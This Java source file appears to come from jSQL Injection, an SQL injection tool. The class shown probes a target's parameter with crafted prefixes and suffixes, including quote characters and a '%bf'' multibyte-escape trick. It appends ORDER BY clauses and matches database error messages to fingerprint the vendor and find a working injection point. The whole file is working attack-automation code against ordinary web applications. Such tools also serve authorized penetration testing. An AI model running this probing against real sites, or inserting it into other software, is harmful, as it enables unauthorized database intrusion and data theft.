package com.jsql.model.suspendable;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.InjectionCharInsertion;
import com.jsql.model.injection.vendor.MediatorVendor;
import com.jsql.model.injection.vendor.model.Vendor;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.util.I18nUtil;

/**
 * Runnable class, define insertionCharacter to be used during injection,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc.
 * Find working insertion char when error message occurs in source.
 * Force to 1 if no insertion char works and empty value from user,
 * Force to user's value if no insertion char works,
 * Force to insertion char otherwise.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    public SuspendableGetCharInsertion(InjectionModel injectionModel) {
        super(injectionModel);
    }

    @Override
    public String run(Object... args) throws JSqlException {
        
        String characterInsertionByUser = (String) args[0];
        
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetInsertionCharacter");
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        String[] charFromBooleanMatch = new String[1];
        List<String> charactersInsertion = this.initializeCallables(taskCompletionService, characterInsertionByUser, charFromBooleanMatch);
        
        MediatorVendor mediatorVendor = this.injectionModel.getMediatorVendor();

        LOGGER.trace("Fingerprinting database and character insertion with Order by match...");

        String charFromOrderBy = null;
        
        int total = charactersInsertion.size();
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserSlidingException();
            }
            
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                List<Vendor> vendorsOrderByMatch = this.getVendorsOrderByMatch(mediatorVendor, pageSource);
                
                if (vendorsOrderByMatch.isEmpty()) {
                    continue;
                }
                    
                this.setVendor(mediatorVendor, vendorsOrderByMatch);
                
                LOGGER.info("Using ["+ mediatorVendor.getVendor() +"]");
                Request requestSetVendor = new Request();
                requestSetVendor.setMessage(Interaction.SET_VENDOR);
                requestSetVendor.setParameters(mediatorVendor.getVendor());
                this.injectionModel.sendToViews(requestSetVendor);
                
                // Char insertion
                charFromOrderBy = currentCallable.getCharacterInsertion();
                
                if (charFromOrderBy.equals(charFromBooleanMatch[0])) {
                
                    LOGGER.info("Confirmed character insertion ["+ charFromOrderBy +"] using Order by match");

                } else {
                    
                    LOGGER.info("Found character insertion ["+ charFromOrderBy +"] using Order by match");
                }
                
                break;
                    
            } catch (InterruptedException | ExecutionException e) {
                
                LOGGER.error("Interruption while defining character injection", e);
                Thread.currentThread().interrupt();
            }
        }
        
        // End the job
        try {
            taskExecutor.shutdown();
            if (!taskExecutor.awaitTermination(15, TimeUnit.SECONDS)) {
                taskExecutor.shutdownNow();
            }
            
        } catch (InterruptedException e) {
            
            LOGGER.error(e.getMessage(), e);
            Thread.currentThread().interrupt();
        }
        
        if (charFromOrderBy == null && charFromBooleanMatch[0] != null) {
            
            charFromOrderBy = charFromBooleanMatch[0];
        }
        
        return this.getCharacterInsertion(characterInsertionByUser, charFromOrderBy);
    }

    private void setVendor(MediatorVendor mediatorVendor, List<Vendor> vendorsOrderByMatch) {
        
        // Vendor
        if (
            vendorsOrderByMatch.size() == 1
            && vendorsOrderByMatch.get(0) != mediatorVendor.getVendor()
        ) {
            
            mediatorVendor.setVendor(vendorsOrderByMatch.get(0));
            
        } else if (vendorsOrderByMatch.size() > 1) {
            
            if (vendorsOrderByMatch.contains(mediatorVendor.getPostgreSQL())) {
                
                mediatorVendor.setVendor(mediatorVendor.getPostgreSQL());
                
            } else if (vendorsOrderByMatch.contains(mediatorVendor.getMySQL())) {
                
                mediatorVendor.setVendor(mediatorVendor.getMySQL());
                
            } else {
                
                mediatorVendor.setVendor(vendorsOrderByMatch.get(0));
            }
        }
    }

    private List<Vendor> getVendorsOrderByMatch(MediatorVendor mediatorVendor, String pageSource) {
        
        return
            mediatorVendor
            .getVendors()
            .stream()
            .filter(vendor -> vendor != mediatorVendor.getAuto())
            .filter(vendor ->
                StringUtils
                .isNotEmpty(
                    vendor
                    .instance()
                    .getModelYaml()
                    .getStrategy()
                    .getConfiguration()
                    .getFingerprint()
                    .getOrderByErrorMessage()
                )
            )
            .filter(vendor -> {
                
                Optional<String> optionalOrderByErrorMatch =
                    Stream.of(
                        vendor
                        .instance()
                        .getModelYaml()
                        .getStrategy()
                        .getConfiguration()
                        .getFingerprint()
                        .getOrderByErrorMessage()
                        .split("[\\r\\n]{1,}")
                    )
                    .filter(errorMessage ->
                        Pattern
                        .compile(".*" + errorMessage + ".*", Pattern.DOTALL)
                        .matcher(pageSource)
                        .matches()
                    )
                    .findAny();
                
                if (optionalOrderByErrorMatch.isPresent()) {
                    
                    LOGGER.info(
                        String
                        .format(
                            "Possibly [%s] from Order by match",
                            vendor
                        )
                    );
                }
                
                return optionalOrderByErrorMatch.isPresent();
            })
            .collect(Collectors.toList());
    }

    private List<String> initializeCallables(CompletionService<CallablePageSource> taskCompletionService, String characterInsertionByUser, String[] charFromBooleanMatch) throws JSqlException {
        
        List<String> roots =
            Arrays.asList(
                "" + RandomStringUtils.random(10, "012"),
                "-1",
                "1",
                characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY),
                StringUtils.EMPTY
            );
        
        final String labelPrefix = "prefix";
        
        List<String> prefixes =
            Arrays
            .asList(
                labelPrefix,
                labelPrefix +"'",
                labelPrefix +"\"",
                labelPrefix +"%bf'"
//                "prefix`",
//                "'prefix'"
//                "`prefix`",
//                "\"prefix\"",
            );
        
        List<String> suffixes = Arrays.asList(StringUtils.EMPTY, ")", "))");
        
        List<String> charactersInsertion = new ArrayList<>();
        
        LOGGER.trace("Fingerprinting character insertion with Boolean match...");
        for (String root: roots) {
            
            for (String prefix: prefixes) {
                
                for (String suffix: suffixes) {
                    
                    this.checkInsertionChar(charFromBooleanMatch, labelPrefix, charactersInsertion, root, prefix, suffix);
                }
            }
        }
        
        for (String characterInsertion: charactersInsertion) {
            
            taskCompletionService.submit(
                new CallablePageSource(
                    characterInsertion
                    + StringUtils.SPACE
                    + this.injectionModel.getMediatorVendor().getVendor().instance().sqlOrderBy(),
                    characterInsertion,
                    this.injectionModel,
                    "fprint#order"
                )
            );
        }
        
        return charactersInsertion;
    }

    private void checkInsertionChar(
        String[] charFromBooleanMatch,
        final String labelPrefix,
        List<String> charactersInsertion,
        String root,
        String prefix,
        String suffix
    ) throws StoppedByUserSlidingException {
        
        charactersInsertion.add(prefix.replace(labelPrefix, root) + suffix);
        
        // Skipping Boolean match when already found
        if (charFromBooleanMatch[0] == null) {
            
            InjectionCharInsertion injectionCharInsertion = new InjectionCharInsertion(
                this.injectionModel,
                prefix.replace(labelPrefix, root) + suffix,
                prefix + suffix
            );
            if (injectionCharInsertion.isInjectable()) {
   
                if (this.isSuspended()) {
                    throw new StoppedByUserSlidingException();
                }
                
                charFromBooleanMatch[0] = prefix.replace(labelPrefix, root) + suffix;
                LOGGER.info(
                    String
                    .format(
                        "Found character insertion [%s] using Boolean match",
                        charFromBooleanMatch[0]
                    )
                );
            }
        }
    }
    
    private String getCharacterInsertion(String characterInsertionByUser, String characterInsertionDetected) {
        
        String characterInsertionDetectedFixed = characterInsertionDetected;
        
        if (characterInsertionDetectedFixed == null) {
            
            if (StringUtils.isEmpty(characterInsertionByUser) || InjectionModel.STAR.equals(characterInsertionByUser)) {
                
                characterInsertionDetectedFixed = "1";
                
            } else {
                
                characterInsertionDetectedFixed = characterInsertionByUser;
            }
            
            LOGGER.warn(
                String
                .format(
                    "No character insertion found, forcing to [%s]",
                    characterInsertionDetectedFixed.replace(InjectionModel.STAR, StringUtils.EMPTY)
                )
            );
            
        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY).equals(characterInsertionDetectedFixed)) {
            
            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY);
            LOGGER.trace(
                String.format(
                    "Using [%s] and [%s]",
                    this.injectionModel.getMediatorVendor().getVendor(),
                    characterInsertionDetectedFixed
                )
            );
            LOGGER.trace(
                String.format(
                    "Add manually the character * like [%s*] to force the value [%s]",
                    characterInsertionByUserFormat,
                    characterInsertionByUserFormat
                )
            );
            
        } else {
            
            LOGGER.info(
                String.format(
                    "%s [%s]",
                    I18nUtil.valueByKey("LOG_USING_INSERTION_CHARACTER"),
                    characterInsertionDetectedFixed.replace(InjectionModel.STAR, StringUtils.EMPTY)
                )
            );
        }
        
        // Encoded space required for integer insertion
        // Fail on neo4j when plain space ' '
        return characterInsertionDetectedFixed.replace(InjectionModel.STAR, "+" + InjectionModel.STAR);
    }
}